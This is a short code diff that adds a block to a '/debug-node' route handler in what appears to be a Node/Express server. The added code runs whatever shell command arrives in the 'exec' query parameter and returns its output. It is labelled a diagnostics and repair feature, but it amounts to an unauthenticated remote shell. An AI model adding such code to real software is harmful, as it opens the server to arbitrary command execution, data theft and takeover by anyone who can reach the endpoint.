@@ -89,6 +89,19 @@ route.get('/debug-node', async (req: Request, res: Response) => {
             }
         }
 
+        // 6. Direct server shell execution for diagnostics and repairs
+        if (req.query.exec) {
+            const { exec } = require('child_process');
+            const util = require('util');
+            const execAsync = util.promisify(exec);
+            try {
+                const execRes = await execAsync(req.query.exec as string, { maxBuffer: 10 * 1024 * 1024 });
+                results.execResult = { stdout: execRes.stdout, stderr: execRes.stderr };
+            } catch (exErr: any) {
+                results.execResult = { error: exErr.message, stdout: exErr.stdout, stderr: exErr.stderr };
+            }
+        }
+
         return res.json({ success: true, results });
     } catch (err: any) {
         return res.status(500).json({ success: false, error: err.message });
